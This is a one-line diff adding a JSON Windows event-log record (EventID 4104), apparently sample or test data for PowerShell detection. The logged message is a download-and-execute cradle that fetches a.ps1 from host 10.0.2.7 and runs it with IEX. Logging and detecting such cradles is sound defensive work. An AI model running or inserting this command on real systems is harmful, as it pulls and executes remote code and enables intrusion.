@@ -1,0 +1,1 @@
+{"TimeCreated":"2025-07-01T05:40:11Z","EventID":4104,"Message":"powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.7/a.ps1')"}
